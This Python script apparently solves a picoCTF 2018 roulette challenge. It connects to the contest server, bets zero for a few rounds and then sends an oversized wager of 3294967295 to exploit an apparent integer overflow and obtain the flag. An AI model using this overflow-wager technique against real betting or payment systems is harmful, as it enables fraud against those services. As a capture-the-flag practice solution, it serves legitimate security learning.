#!/usr/bin/env python3
import socket

s = socket.socket()
s.connect(('2018shell2.picoctf.com',48312))


win = 0 
count = 0

while True:
    data = s.recv(4096).decode().strip()
    if not data:
        continue

    if 'How much will you wager?' in data:
        if win < 3:
            s.send(b'0\n')
        else:
            s.send(b'3294967295\n')

    elif 'Current Wins: ' in data:
        win = (data.split('Current Wins: ')[1])[0]
        win = int(win)
        print("Win:", win)

        count += 1
        print("Round:", count)

    elif 'Choose a number (1-36)' in data:
        s.send(b'2\n')

    elif 'pico' in data:
        print("Received:", data)
